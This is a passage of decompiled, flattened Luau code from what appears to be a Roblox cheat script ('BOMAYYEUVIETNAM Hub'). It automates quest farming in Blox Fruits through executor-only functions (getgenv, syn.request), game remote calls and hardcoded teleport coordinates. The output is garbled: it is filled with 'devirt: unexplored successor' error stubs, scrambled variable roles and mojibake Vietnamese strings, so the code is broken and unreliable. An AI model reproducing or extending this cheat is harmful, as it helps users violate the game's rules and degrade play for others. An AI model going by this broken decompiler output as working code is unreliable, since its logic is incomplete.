                  typeAccountScroll.Mon = "Snow Bandit"
                  typeAccountScroll.Quest = "SnowQuest"
                  typeAccountScroll.QLv = 1
                  typeAccountScroll.Next = 100

                  new2 = CFrame.new
                  bomayyeuvietnamKaitunRunning3 = 314
                  itemLabel1 = "CQ"
                  itemLabel12 = 1389.74451
                  textLabel = 86.6520844
                  levelLabel = -1298.90796
                  new3 = -0.342042685
                  dropShadow2 = 0
                  main = 0.939684391
                  new4 = 0
                  new5 = 1
                elseif bomayyeuvietnamKaitunRunning3 <= 86 then
                  coinCard[fromRGB2] = fontWeight
                  coinCard.ResetOnSpawn = false
                  coinCard.DisplayOrder = 20

                  frame.AnchorPoint = Vector2.new(0.5, 0.5)
                  frame.BackgroundColor3 = Color3.fromRGB(163, 163, 163)
                  frame.BackgroundTransparency = 1

                  fontWeight = Color3.fromRGB
                  bomayyeuvietnamKaitunRunning3 = 164
                  fromRGB2 = "BorderColor3"
                  cframe3 = 27
                  val42 = 42
                  val43 = 53
                else
                  udim2[textLabel2] = "Arctic Warrior"

                  udim2.CQ = CFrame.new(
                    5667.6582, 26.7997818, -6486.08984, -0.933587909, 0, -0.358349502, 0, 1, 0, 0.358349502, 0, -0.933587909
                  )

                  udim22 = CFrame.new
                  bomayyeuvietnamKaitunRunning3 = 268
                  textLabel2 = "CMon"
                  under = 5513.36865
                  uiGradient = 60.546711
                  new7 = -6809.94971
                  fromRGB2 = -0.958693981
                  fontWeight = -1.65617333e-8
                  cframe3 = 0.284439981
                  val42 = -4.07668654e-9
                  val43 = 1
                end
              elseif bomayyeuvietnamKaitunRunning3 <= 90 then
                if bomayyeuvietnamKaitunRunning3 <= 88 then
                  new4[new5] = Vector2.new(0.5, 0)
                  new4.BackgroundColor3 = Color3.fromRGB(163, 162, 165)
                  new4.BackgroundTransparency = 1
                  new4.Position = UDim2.new(0.5, 0, 0, 10)

                  fromRGB = UDim2.new
                  bomayyeuvietnamKaitunRunning3 = 13
                  new5 = "Size"
                  cframe2 = 0
                elseif bomayyeuvietnamKaitunRunning3 <= 89 then
                  fromRGB.FontFace = Font.new(
                    "rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal
                  )

                  fromRGB.Text = "Ã°ÂŸÂ”Â´ Skull Guitar"
                  fromRGB.TextColor3 = Color3.fromRGB(255, 255, 255)
                  fromRGB.TextSize = 16

                  bomayyeuvietnamKaitunRunning3 = 181
                else
                  typeAccountScroll[itemLabel1] = new2

                  typeAccountScroll.CQ = CFrame.new(
                    5448.86133, 601.516174, 751.130676, 0, 0, 1, 0, 1, 0, -1, 0, 0
                  )

                  typeAccountScroll.CMon = CFrame.new(4770.499023, 758.9552, 1069.868041)

                  itemLabel1 = { Min = 1650 }
                  bomayyeuvietnamKaitunRunning3 = 116
                end
              elseif bomayyeuvietnamKaitunRunning3 <= 91 then
                divider[divider2] = typeAccountScroll

                divider2 = {
                  Min = 75, Max = 89, Ms = "Desert Officer", Mon = "Desert Officer", Quest = "DesertQuest", QLv = 2, Next = 90, Fallback = "Desert Bandit", }

                itemLabel1 = CFrame.new
                bomayyeuvietnamKaitunRunning3 = 74
                typeAccountScroll = "CQ"
                new2 = 894.488647
                itemLabel12 = 5.14000702
              elseif bomayyeuvietnamKaitunRunning3 <= 92 then
                cframe = syn.request
                bomayyeuvietnamKaitunRunning3 = 193
              else
                new[divider] = "Area1Quest"
                new.QLv = 2
                new.Next = 775
                new.Fallback = "Raider"

                new.CQ = CFrame.new(
                  -429.543518, 71.7699966, 1836.18188, -0.22495985, 0, -0.974368095, 0, 1, 0, 0.974368095, 0, -0.22495985
                )

                divider2 = CFrame
                bomayyeuvietnamKaitunRunning3 = 311
                divider = "CMon"
                typeAccountScroll = "new"
              end

              continue
            elseif bomayyeuvietnamKaitunRunning3 <= 140 then
              if bomayyeuvietnamKaitunRunning3 <= 116 then
                if bomayyeuvietnamKaitunRunning3 <= 104 then
                  if bomayyeuvietnamKaitunRunning3 <= 98 then
                    if bomayyeuvietnamKaitunRunning3 <= 95 then
                      if bomayyeuvietnamKaitunRunning3 <= 94 then
                        new[dutDit] = fromRGB2(fontWeight, cframe3, val42)
                        new.Thickness = 2.5
                        new.Parent = cframe

                        divider.BorderColor3 = Color3.fromRGB(27, 42, 53)
                        divider.Name = "Divider"
                        divider.Parent = cframe
                        divider.Position = UDim2.new(0.15000000596046, 0, 0.15000000596046, 0)

                        bomayyeuvietnamKaitunRunning3 = 112
                        dutDit = "Size"
                      else
                        divider[divider2] = typeAccountScroll[itemLabel1](
                          894.488647, 5.14000702, 4392.43359, 0.819155693, 0, -0.573571265, 0, 1, 0, 0.573571265, 0, 0.819155693
                        )

                        typeAccountScroll = CFrame.new(
                          932.788818, 6.8503746, 4488.24609, -0.998625934, 3.08948351e-8, 0.0524050146, 2.79967303e-8, 1, -5.60361286e-8, -0.0524050146, -5.44919629e-8, -0.998625934
                        )

                        bomayyeuvietnamKaitunRunning3 = 91
                        divider2 = "CMon"
                      end

                      continue
                    elseif bomayyeuvietnamKaitunRunning3 <= 96 then
                      val97 = 10
                      break
                    else
                      if bomayyeuvietnamKaitunRunning3 <= 97 then
                        under[uiGradient] = CFrame.new(-1817.974731, 209.563278, -12288.92285)

                        uiGradient = {
                          Min = 2250, Max = 2299, Ms = "Baking Staff", Mon = "Baking Staff", Quest = "CakeQuest2", QLv = 1, Next = 2300, }

                        bomayyeuvietnamKaitunRunning3 = 69
                        new7 = "Fallback"
                        fromRGB2 = "Cookie Crafter"
                      else
                        cameraBlur = cframe[dutDit]("BlurEffect")
                        cameraBlur.Name = "CameraBlur"
                        cameraBlur.Size = 8
                        cameraBlur.Parent = frame

                        coinCard = Instance.new("ScreenGui")
                        frame = Instance.new("Frame")
                        cframe = Instance.new("Frame")
                        dutDit = Instance.new("UICorner")
                        new = Instance
                        bomayyeuvietnamKaitunRunning3 = 308
                      end

                      continue
                    end
                  else
                    if bomayyeuvietnamKaitunRunning3 <= 101 then
                      if bomayyeuvietnamKaitunRunning3 <= 99 then
                        val48[new8] = val49(
                          new9, val50, val51, val52, val53, val54, val55, val56, 8.00902953e-8, 0.946948707, -4.18033075e-8, -0.321384728
                        )

                        val48.CMon = CFrame.new(
                          10671.2715, -2057.59155, 10047.2588, -0.846484065, -3.11045447e-8, 0.532414079, -5.55383117e-8, 1, -2.98785316e-8, -0.532414079, -5.48610757e-8, -0.846484065
                        )

                        new8 = { Min = 2675, Max = 2699 }
                        bomayyeuvietnamKaitunRunning3 = 2
                      elseif bomayyeuvietnamKaitunRunning3 <= 100 then
                        divider2[typeAccountScroll] = itemLabel1
                        divider2.Mon = "Dragon Crew Archer"
                        divider2.Quest = "AmazonQuest"
                        divider2.QLv = 2
                        divider2.Next = 1625
                        divider2.Fallback = "Dragon Crew Warrior"

                        itemLabel1 = CFrame.new
                        bomayyeuvietnamKaitunRunning3 = 48
                        typeAccountScroll = "CQ"
                        new2 = 5832.83594
                        itemLabel12 = 51.6806107
                        textLabel = -1101.51563
                        levelLabel = 0.898790359
                        new3 = 0
                        dropShadow2 = -0.438378751
                        main = 0
                        new4 = 1
                        new5 = 0
                        fromRGB = 0.438378751
                        new6 = 0
                        cframe2 = 0.898790359
                      else
                        udim22[under] = uiGradient(
                          new7, fromRGB2, fontWeight, cframe3, val42, val43, val44, val45, val46, -0.996196866, 0, 0.087131381
                        )

                        udim22.CMon = CFrame.new(
                          5569.80518, 38.5269432, 3849.01196, 0.896460414, 3.98027495e-8, 0.443124533, -1.34262139e-8, 1, -6.26611296e-8, -0.443124533, 5.02237434e-8, 0.896460414
                        )

                        under = { Min = 650, Max = 9999 }
                        bomayyeuvietnamKaitunRunning3 = 14
                        uiGradient = "Ms"
                        new7 = "Galley Captain"
                      end
                    elseif bomayyeuvietnamKaitunRunning3 <= 102 then
                      new7[dutDit] = new(udim2, udim22, 0.5, 0)
                      new7.Size = UDim2.new(1, 47, 1, 47)
                      new7.ZIndex = 0
                      new7.Image = "rbxthumb://type=Asset&id=110625942841371&w=150&h=150"
                      new7.ImageTransparency = 0.25
                      new7.ImageColor3 = Color3.fromRGB(0, 0, 0)

                      bomayyeuvietnamKaitunRunning3 = 145
                    elseif bomayyeuvietnamKaitunRunning3 <= 103 then
                      frame = getgenv().Configs.Quest["RGB Haki"]
                      bomayyeuvietnamKaitunRunning3 = 34
                    else
                      new[divider] = CFrame.new(
                        -4957.67041, 35.949837, -4665.599609, 0.890994847, 0, -0.454013437, 0, 1, 0, 0.454013437, 0, 0.890994847
                      )

                      new[3] = CFrame.new(-4975.763671875, 314.5537109375, -3215.6198730469)

                      cframe[dutDit] = new
                      cframe.Command = { "BuyFishmanKarate" }

                      bomayyeuvietnamKaitunRunning3 = 55
                    end

                    continue
                  end
                elseif bomayyeuvietnamKaitunRunning3 <= 110 then
                  if bomayyeuvietnamKaitunRunning3 <= 107 then
                    if bomayyeuvietnamKaitunRunning3 <= 105 then
                      divider = Instance.new("TextLabel")
                      divider.Name = "SectionTitle"
                      divider.Parent = dutDit
                      divider.Position = UDim2.new(0, 12, 0, 10)
                      divider.Size = UDim2.new(1, -24, 0, 20)

                      bomayyeuvietnamKaitunRunning3 = 221
                      divider2 = "BackgroundTransparency"
                    elseif bomayyeuvietnamKaitunRunning3 <= 106 then
                      new5.Ms = "Ship Deckhand"
                      new5.Mon = "Ship Deckhand"
                      new5.Quest = "ShipQuest1"
                      new5.QLv = 1
                      new5.Next = 1275

                      new6 = CFrame.new(
                        1037.80127, 125.092171, 32911.6016, -0.244533166, 0, -0.969640911, 0, 1.00000012, 0, 0.96964103, 0, -0.244533136
                      )

                      bomayyeuvietnamKaitunRunning3 = 359
                      fromRGB = "CQ"
                    else
                      textLabel[levelLabel] = new3
                      textLabel.Quest = "SnowMountainQuest"
                      textLabel.QLv = 1
                      textLabel.Next = 1050

                      textLabel.CQ = CFrame.new(
                        609.858826, 400.119904, -5372.25928, -0.374604106, 0, 0.92718488, 0, 1, 0, -0.92718488, 0, -0.374604106
                      )

                      new3 = CFrame.new
                      bomayyeuvietnamKaitunRunning3 = 362
                      levelLabel = "CMon"
                    end
                  elseif bomayyeuvietnamKaitunRunning3 <= 108 then
                    top[divider] = divider2(udim2, udim22, 0, 22)
                    top.Text = "BOMAYYEUVIETNAM Hub"
                    top.TextColor3 = val25.Text
                    top.TextSize = 17
                    top.TextXAlignment = Enum.TextXAlignment.Left
                    top.TextYAlignment = Enum.TextYAlignment.Center

                    divider = Instance.new
                    bomayyeuvietnamKaitunRunning3 = 277
                  elseif bomayyeuvietnamKaitunRunning3 <= 109 then
                    typeAccountScroll[dutDit] = new[fromRGB2](27, 42, 53)
                    typeAccountScroll.Name = "TypeAccountScroll"
                    typeAccountScroll.Parent = cframe

                    typeAccountScroll.Position = UDim2.new(
                      0.55000001192093, 0, 0.34999999403954, 0
                    )

                    typeAccountScroll.Size = UDim2.new(0.40000000596046, 0, 0.34999999403954, 0)

                    bomayyeuvietnamKaitunRunning3 = 6
                    dutDit = "Selectable"
                  else
                    bomayyeuvietnamKaitunRunning3 = frame and 151 or 146
                  end

                  continue
                elseif bomayyeuvietnamKaitunRunning3 <= 113 then
                  if bomayyeuvietnamKaitunRunning3 <= 111 then
                    val97 = 9
                    break
                  end

                  if bomayyeuvietnamKaitunRunning3 <= 112 then
                    divider[dutDit] = UDim2.new(0.69999998807907, 0, 0, 2)
                    divider.Selectable = false

                    divider2.BorderColor3 = Color3.fromRGB(27, 42, 53)
                    divider2.Name = "Divider"
                    divider2.Parent = cframe

                    new = UDim2.new
                    bomayyeuvietnamKaitunRunning3 = 343
                    dutDit = "Position"
                    fromRGB2 = 0.10000000149012
                    fontWeight = 0
                  else
                    new3[dropShadow2] = main(
                      new4, new5, fromRGB, new6, cframe2, top, udim2, textLabel2, udim22, -0.822046936, -6.74401548e-8, -0.569419742
                    )

                    dropShadow2 = {
                      Min = 1125, Max = 1174, Ms = "Horned Warrior", Mon = "Horned Warrior", Quest = "IceSideQuest", QLv = 2, Next = 1175, Fallback = "Lab Subordinate", }

                    new4 = CFrame
                    bomayyeuvietnamKaitunRunning3 = 52
                    main = "CQ"
                  end

                  continue
                else
                  if bomayyeuvietnamKaitunRunning3 <= 114 then
                    cframe2.Ms = "Peanut Scout"
                    cframe2.Mon = "Peanut Scout"
                    cframe2.Quest = "NutsIslandQuest"
                    cframe2.QLv = 1
                    cframe2.Next = 2100

                    udim2 = CFrame.new(
                      -2104.17163, 38.1299706, -10194.418, 0.758814394, -1.38604395e-9, 0.651306927, 2.85280208e-8, 1, -3.1108879e-8, -0.651306927, 4.21863646e-8, 0.758814394
                    )

                    bomayyeuvietnamKaitunRunning3 = 158
                    top = "CQ"
                  elseif bomayyeuvietnamKaitunRunning3 <= 115 then
                    new2[itemLabel12] = textLabel[levelLabel](
                      -4882.8623, 22.6520386, 4255.53516, 0.273695946, -5.40380647e-8, -0.96181643, 4.37720793e-8, 1, -4.37274998e-8, 0.96181643, -3.01326679e-8, 0.273695946
                    )

                    itemLabel12 = {
                      Min = 99999, Max = 99999, Ms = "Sky Bandit", Mon = "Sky Bandit", Quest = "SkyQuest", }

                    bomayyeuvietnamKaitunRunning3 = 252
                    textLabel = "QLv"
                  else
                    itemLabel1.Max = 1699
                    itemLabel1.Ms = "Giant Islander"
                    itemLabel1.Mon = "Giant Islander"
                    itemLabel1.Quest = "AmazonQuest2"
                    itemLabel1.QLv = 2
                    itemLabel1.Next = 1700
                    itemLabel1.Fallback = "Female Islander"

                    itemLabel12 = CFrame.new
                    bomayyeuvietnamKaitunRunning3 = 177
                    new2 = "CQ"
                    textLabel = 5448.86133
                    levelLabel = 601.516174
                    new3 = 751.130676
                    dropShadow2 = 0
                    main = 0
                    new4 = 1
                    new5 = 0
                  end

                  continue
                end
              elseif bomayyeuvietnamKaitunRunning3 <= 128 then
                if bomayyeuvietnamKaitunRunning3 <= 122 then
                  if bomayyeuvietnamKaitunRunning3 <= 119 then
                    if bomayyeuvietnamKaitunRunning3 <= 117 then
                      new[dropShadow2] = main
                      new.Size = UDim2.new(0, 320, 0, 68)
                      new.ZIndex = 0

                      dropShadow2 = Instance.new("ImageLabel")
                      dropShadow2.Name = "DropShadow2"
                      dropShadow2.Parent = new
                      dropShadow2.AnchorPoint = Vector2.new(0.5, 0.5)

                      new4 = Color3
                      bomayyeuvietnamKaitunRunning3 = 230
                      main = "BackgroundColor3"
                    elseif bomayyeuvietnamKaitunRunning3 <= 118 then
                      val32[frame] = cframe(dutDit, new, -1305.22)
                      val32.MarineQuest2 = CFrame.new(-4688.98, 5.88, 4226.45)
                      val32.SkyQuest = CFrame.new(-4742.24, 967.4, -745.69)
                      val32.PrisonerQuest = CFrame.new(5201.2, 19.55, 735.93)

                      bomayyeuvietnamKaitunRunning3 = 229
                      frame = "ImpelQuest"
                    else
                      bomayyeuvietnamKaitunRunning3 = frame and 212 or 210
                    end
                  elseif bomayyeuvietnamKaitunRunning3 <= 120 then
                    levelLabel[new3] = dropShadow2(
                      main, new4, new5, -0.698032081, -8.28980049e-8, -0.71606636, -1.98835952e-8, 1, -9.63858184e-8, 0.71606636, -5.30424877e-8, -0.698032081
                    )

                    new3 = {
                      Min = 1100, Max = 1124, Ms = "Lab Subordinate", Mon = "Lab Subordinate", Quest = "IceSideQuest", QLv = 1, }

                    bomayyeuvietnamKaitunRunning3 = 28
                    dropShadow2 = "Next"
                    main = 1125
                  elseif bomayyeuvietnamKaitunRunning3 <= 121 then
                    cframe2.Next = 475
                    cframe2.Fallback = "Fishman Commando"
                    cframe2.CQ = CFrame.new(-4721.71436, 845.277161, -1954.20105)
                    cframe2.CMon = CFrame.new(-4716.95703, 853.089722, -1933.925427)

                    top = { Min = 475, Max = 524 }
                    bomayyeuvietnamKaitunRunning3 = 270
                    udim2 = "Ms"
                  else
                    function val22.PrioritizeRipIndra(ripIndraTrueForm5)
                      local val169 = 10
                      local humanoid3 = nil
                      local humanoidRootPart3 = nil
                      local val170 = nil

                      while true do
                        if val169 <= 13 then
                          if val169 <= 6 then
                            if val169 <= 2 then
                              if val169 <= 0 then
                                val19.Remotes.CommF_:InvokeServer("Buso")
                                val169 = 5
                              elseif val169 <= 1 then
                                val169 = val170 and 20 or 3
                              else
                                val35(humanoidRootPart3.CFrame * CFrame.new(0, 30, 0), 1.5)
                                val169 = 20
                              end

                              continue
                            end

                            if val169 <= 4 then
                              if val169 <= 3 then
                                val21.wt(0.1)
                                val169 = not val21.ffc(localPlayer.Character, "HasBuso") and 0 or 5
                                continue
                              end

                              return false
                            end

                            if val169 <= 5 then
                              val35(humanoidRootPart3.CFrame * CFrame.new(0, -30, 0), 1.5)
                              val36()
                              local val171 = ripIndraTrueForm5.Parent ~= val18

                              if val171 then
                                val169 = 17
                                val170 = val171
                              else
                                val169 = 11
                              end
                            else
                              local fireEssence3 = val34("Fire Essence")

                              if fireEssence3 then
                                val169 = 14
                              else
                                val169 = 26
                                ripIndraTrueForm5 = fireEssence3
                              end
                            end

                            continue
                          end

                          if val169 <= 9 then
                            if val169 <= 7 then
                              humanoid3 = ripIndraTrueForm5:FindFirstChild("Humanoid")
                              val169 = 27
                            elseif val169 <= 8 then
                              humanoidRootPart3 = ripIndraTrueForm5:FindFirstChild("HumanoidRootPart")
                              val169 = 15
                            else
                              ripIndraTrueForm5 = val19:FindFirstChild("rip_indra True Form")
                              val169 = 12
                            end
                          elseif val169 <= 11 then
                            if val169 <= 10 then
                              local val172 = not Three_World

                              if val172 then
                                val169 = 26
                                ripIndraTrueForm5 = val172
                              else
                                val169 = 6
                              end
                            else
                              val170 = humanoid3.Health <= 0
                              val169 = 17
                            end
                          elseif val169 <= 12 then
                            if ripIndraTrueForm5 then
                              val169 = 7
                            else
                              val169 = 27
                              humanoid3 = ripIndraTrueForm5
                            end
                          else
                            Quest = nil
                            val21.Status(" Status : Farm rip_indra")
                            val169 = ripIndraTrueForm5.Parent == val18 and 3 or 2
                          end
                        else
                          if val169 <= 20 then
                            if val169 <= 16 then
                              if val169 <= 14 then
                                ripIndraTrueForm5 = not ripIndraTrueForm5
                                val169 = 26
                              elseif val169 <= 15 then
                                local val173 = not humanoid3

                                if val173 then
                                  val169 = 23
                                  val170 = val173
                                else
                                  val169 = 18
                                end
                              else
                                local ripIndraTrueForm6 = val18:FindFirstChild("rip_indra True Form")

                                if ripIndraTrueForm6 then
                                  val169 = 12
                                  ripIndraTrueForm5 = ripIndraTrueForm6
                                else
                                  val169 = 9
                                end
                              end
                            elseif val169 <= 18 then
                              if val169 <= 17 then
                                val169 = val170 and 1 or 19
                              else
                                val170 = not humanoidRootPart3
                                val169 = 23
                              end
                            elseif val169 <= 19 then
                              val170 = not getgenv().AutoFarm
                              val169 = 1
                            else
                              val169 = 22
                              ripIndraTrueForm5 = true
                            end

                            continue
                          end

                          if val169 <= 23 then
                            if val169 <= 21 then
                              return false
                            end

                            if val169 <= 22 then
                              break
                            end

                            val169 = val170 and 24 or 25
                            continue
                          end

                          if val169 <= 25 then
                            if val169 <= 24 then
                              val169 = val170 and 21 or 13
                            else
                              val170 = humanoid3.Health <= 0
                              val169 = 24
                            end
                          elseif val169 <= 26 then
                            val169 = ripIndraTrueForm5 and 4 or 16
                          elseif ripIndraTrueForm5 then
                            val169 = 8
                          else
                            val169 = 15
                            humanoidRootPart3 = ripIndraTrueForm5
                          end
                        end
                      end

                      return ripIndraTrueForm5
                    end

                    task.spawn(function()
                      local val174 = 4

                      while true do
                        if val174 <= 1 then
                          if val174 <= 0 then
                            val174 = not noFruit and 3 or 4
                          else
                            pcall(val36)
                            val174 = 4
                          end

                          continue
                        end

                        if not (val174 <= 2) then
                          if val174 <= 3 then
                            val38()
                            val174 = 1
                          else
                            val174 = val21.wt() and 0 or 2
                          end

                          continue
                        end

                        break
                      end
                    end)

                    getgenv().AutoFarm = false
                    val21.Status(" Status : Read Melee Inventory")
                    val22.GetStep(true)
                    getgenv().AutoFarm = true
                    local threeWorld3 = Three_World

                    if threeWorld3 then
                      bomayyeuvietnamKaitunRunning3 = 279
                    else
                      bomayyeuvietnamKaitunRunning3 = 339
                      frame = threeWorld3
                    end
                  end
                elseif bomayyeuvietnamKaitunRunning3 <= 125 then
                  if bomayyeuvietnamKaitunRunning3 <= 123 then
                    new3[dropShadow2] = main(
                      new4, new5, fromRGB, new6, cframe2, top, 1.60817859e-9, 1, -5.16744869e-9, 0.995993316, -2.06384709e-9, -0.0894274712
                    )

                    new3.CMon = CFrame.new(
                      5433.39307, 88.678093, 514.986877, 0.879988372, 0, -0.474995494, 0, 1, 0, 0.474995494, 0, 0.879988372
                    )

                    dropShadow2 = { Min = 250 }
                    bomayyeuvietnamKaitunRunning3 = 22
                    main = "Max"
                    new4 = 274
                  elseif bomayyeuvietnamKaitunRunning3 <= 124 then
                    dropShadow2[main] = new4(new5, fromRGB, 450, 450)

                    main = Instance.new("Frame")
                    main.Name = "Main"
                    main.Parent = dropShadow2
                    main.AnchorPoint = Vector2.new(0.5, 0.5)
                    main.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
                    main.BackgroundTransparency = 0.5

                    bomayyeuvietnamKaitunRunning3 = 288
                  else
                    udim22[under] = uiGradient(
                      new7, fromRGB2, fontWeight, 0.990270376, 0, -0.13915664, 0, 1, 0, 0.13915664, 0, 0.990270376
                    )

                    udim22.CMon = CFrame.new(
                      -3212.99683, 263.809296, -10551.8799, 0.742111444, -5.59139615e-8, -0.670276582, 1.69155214e-8, 1, -6.46908234e-8, 0.670276582, 3.66697037e-8, 0.742111444
                    )

                    cframe[1] = dutDit
                    cframe[2] = new
                    cframe[3] = divider
                    cframe[4] = divider2
                    cframe[5] = typeAccountScroll
                    cframe[6] = itemLabel1
                    cframe[7] = new2
                    cframe[8] = itemLabel12
                    cframe[9] = textLabel
                    cframe[10] = levelLabel
                    cframe[11] = new3
                    cframe[12] = dropShadow2
                    cframe[13] = main
                    cframe[14] = new4
                    cframe[15] = new5
                    cframe[16] = fromRGB
                    cframe[17] = new6
                    cframe[18] = cframe2
                    cframe[19] = top
                    cframe[20] = udim2
                    cframe[21] = textLabel2
                    cframe[22] = udim22

                    val31[frame] = cframe
                    bomayyeuvietnamKaitunRunning3 = 44
                    frame = "Three_World"
                  end
                elseif bomayyeuvietnamKaitunRunning3 <= 126 then
                  cframe:CreateUI({
                    Title = "BOMAYYEUVIETNAM Hub", Subtitle = "Xin ChÃƒÂ o", Backend = { BaseURL = nil, WorkerURL = nil }, })

                  bomayyeuvietnamKaitunRunning3 = 167
                elseif bomayyeuvietnamKaitunRunning3 <= 127 then
                  val23[frame] = cframe(-16122.41, 10.64, -257.35)
                  val23["Sun-kissed Warrior"] = CFrame.new(-16357.31, 20.64, 1005.65)
                  val23["Isle Champion"] = CFrame.new(-16787.32, 20.64, 992.13)
                  val23["Serpent Hunter"] = CFrame.new(-16599.71, 70.59, 1757.91)

                  bomayyeuvietnamKaitunRunning3 = 256
                else
                  divider[divider2] = typeAccountScroll.TextXAlignment.Left

                  local content6 = Instance.new("Frame")
                  content6.Name = "Content"
                  content6.Parent = dutDit
                  content6.Position = UDim2.new(0, 12, 0, 39)

                  divider2 = UDim2.new
                  bomayyeuvietnamKaitunRunning3 = 131
                  divider = "Size"
                  typeAccountScroll = 1
                  fromRGB = -24
                  dutDit = content6
                end

                continue
              elseif bomayyeuvietnamKaitunRunning3 <= 134 then
                if bomayyeuvietnamKaitunRunning3 <= 131 then
                  if bomayyeuvietnamKaitunRunning3 <= 129 then
                    new5[frame] = Vector2.new(0, 0)
                    new5.TextColor3 = val25.Text
                    new5.TextSize = 12
                    new5.TextXAlignment = Enum.TextXAlignment.Left
                    new5.TextTruncate = Enum.TextTruncate.AtEnd

                    frame = Instance.new("ScreenGui")
                    dutDit = Instance
                    bomayyeuvietnamKaitunRunning3 = 329
                    new = "new"
                    continue
                  elseif bomayyeuvietnamKaitunRunning3 <= 130 then
                    val97 = 8
                    break
                  else
                    dutDit[divider] = divider2(typeAccountScroll, fromRGB, 1, -51)
                    dutDit.BackgroundTransparency = 1

                    divider = Instance.new("UIGridLayout")
                    divider.Parent = dutDit
                    divider.CellPadding = UDim2.new(0, 8, 0, 8)

                    typeAccountScroll = UDim2.new
                    bomayyeuvietnamKaitunRunning3 = 194
                    divider2 = "CellSize"
                    fromRGB = 0.3333
                    cframe2 = -6
                    top = 0
                    continue
                  end
                else
                  if bomayyeuvietnamKaitunRunning3 <= 132 then
                    main.Size = UDim2.new(1, -32, 1, -32)
                    main.BackgroundColor3 = val25.Background
                    main.BackgroundTransparency = 0.08
                    main.BorderSizePixel = 0

                    val26(main, 7)
                    val27(main, val25.Primary, 1.25, 0.1)
                    dutDit = UDim2.new
                    bomayyeuvietnamKaitunRunning3 = 227
                    frame = "Position"
                  elseif bomayyeuvietnamKaitunRunning3 <= 133 then
                    itemLabel12 = itemLabel12("TextLabel")
                    textLabel = Instance.new("TextLabel")
                    levelLabel = Instance.new("TextLabel")
                    new3 = Instance.new("TextLabel")
                    dropShadow2 = Instance.new("TextLabel")
                    main = Instance.new("TextLabel")
                    new4 = Instance.new("TextLabel")
                    bomayyeuvietnamKaitunRunning3 = 372
                  else
                    main[dutDit] = 16
                    main.TextXAlignment = Enum.TextXAlignment.Left
                    main.TextYAlignment = Enum.TextYAlignment.Bottom

                    new4.BackgroundTransparency = 1
                    new4.Parent = cframe
                    new4.Position = UDim2.new(0.75, 0, 0.80000001192093, 0)

                    bomayyeuvietnamKaitunRunning3 = 232
                    dutDit = "Size"
                  end

                  continue
                end
              elseif bomayyeuvietnamKaitunRunning3 <= 137 then
                if bomayyeuvietnamKaitunRunning3 <= 135 then
                  divider[fromRGB] = top
                  divider.Size = UDim2.new(1, -24, 1, -48)
                  divider.BackgroundTransparency = 1

                  fromRGB = Instance.new("UIListLayout")
                  fromRGB.Parent = divider
                  fromRGB.Padding = UDim.new(0, 1)

                  udim2 = Enum
                  bomayyeuvietnamKaitunRunning3 = 315
                  top = "SortOrder"
                  continue
                elseif bomayyeuvietnamKaitunRunning3 <= 136 then
                  val97 = 7
                  break
                else
                  new3[dutDit] = "Race: N/A"
                  new3.TextColor3 = Color3.fromRGB(255, 255, 255)
                  new3.TextSize = 16
                  new3.TextXAlignment = Enum.TextXAlignment.Left
                  new3.TextYAlignment = Enum.TextYAlignment.Bottom

                  dropShadow2.BackgroundTransparency = 1
                  bomayyeuvietnamKaitunRunning3 = 179
                  dutDit = "Parent"
                  continue
                end
              elseif bomayyeuvietnamKaitunRunning3 <= 138 then
                new[2] = CFrame.new(
                  1377.125, 246.542007, -5189.951172, 0.034849405, 0, -0.999392569, 0, 1, 0, 0.999392569, 0, 0.034849405
                )

                new[3] = CFrame.new(-4975.763671875, 314.5537109375, -3215.6198730469)

                cframe[dutDit] = new
                new = {}
                bomayyeuvietnamKaitunRunning3 = 176
                dutDit = "Command"
                divider = "BuySuperhuman"
                continue
              elseif bomayyeuvietnamKaitunRunning3 <= 139 then
                val97 = 6
                break
              else
                val32[frame] = cframe.new(-1682.12, 50.07, 175.15)
                val32.BuggyQuest1 = CFrame.new(-1151.81, 17.3, 3861.56)
                val32.DesertQuest = CFrame.new(869.77, 5.9, 4454.12)

                cframe = CFrame.new
                bomayyeuvietnamKaitunRunning3 = 118
                frame = "SnowQuest"
                dutDit = 1395.42
                new = 78.03
                continue
              end
            elseif bomayyeuvietnamKaitunRunning3 <= 164 then
              if bomayyeuvietnamKaitunRunning3 <= 152 then
                if bomayyeuvietnamKaitunRunning3 <= 146 then
                  if bomayyeuvietnamKaitunRunning3 <= 143 then
                    if bomayyeuvietnamKaitunRunning3 <= 141 then
                      cframe = request
                      bomayyeuvietnamKaitunRunning3 = 301
                      continue
                    elseif bomayyeuvietnamKaitunRunning3 <= 142 then
                      val23[frame] = CFrame.new(-11823.74, 331.8, -10593.36)
                      val23["Musketeer Pirate"] = CFrame.new(-13406.02, 391.61, -9783.03)
                      val23["Reborn Skeleton"] = CFrame.new(-8766.81, 142.17, 6061.28)

                      cframe = CFrame.new
                      bomayyeuvietnamKaitunRunning3 = 20
                      frame = "Living Zombie"
                      dutDit = -10196.96
                      new = 138.69
                      continue
                    end
                  else
                    val97 = 5
                    break
                  end
                else
                  val97 = 4
                  break
                end
              else
                val97 = 3
                break
              end
            else
              val97 = 2
              break
            end

            break
          end

          val97 = 1
          break
        end

        if val97 == 1 then
          error("devirt: unexplored successor 241:5916")
        end

        if val97 == 2 then
          error("devirt: unexplored successor 241:6865")
        end

        if val97 == 3 then
          error("devirt: unexplored successor 241:9364")
        end

        if val97 == 4 then
          error("devirt: unexplored successor 241:8796")
        end

        if val97 == 5 then
          error("devirt: unexplored successor 241:10514")
        end

        if val97 == 6 then
          frame:Kick("KhÃƒÂ´ng thÃ¡Â»Âƒ tÃ¡ÂºÂ£i giao diÃ¡Â»Â‡n xÃƒÂ¡c thÃ¡Â»Â±c")
          return
        end

        if val97 == 7 then
          warn("[BOMAYYEUVIETNAM Kaitun] Script is already running")
          return
        end

        if val97 == 8 then
          val96 = fromRGB2(fontWeight, table.unpack(element11, 1, element11.n))
          continue
        end

        break
      end

      if val97 == 9 then
        frame:Kick("Executor khÃƒÂ´ng hÃ¡Â»Â— trÃ¡Â»Â£ HTTP request")
        return
      end

      if val97 ~= 10 then
        textLabel2[dutDit] = new[udim2](255, 255, 255)
        error("devirt: unexplored successor 241:29")
      end
    else
      if val57 == 5 then
        frame:Kick("Executor khÃƒÂ´ng hÃ¡Â»Â— trÃ¡Â»Â£ HTTP request")
        return
      end

      if val57 ~= 6 then
        error("devirt: unexplored successor 241:334")
      end
    end

    return
  end

  error("devirt: unexplored successor 241:5916")
end

local val175, success = pcall(localPlayer)

pcall(function()
  if getgenv then
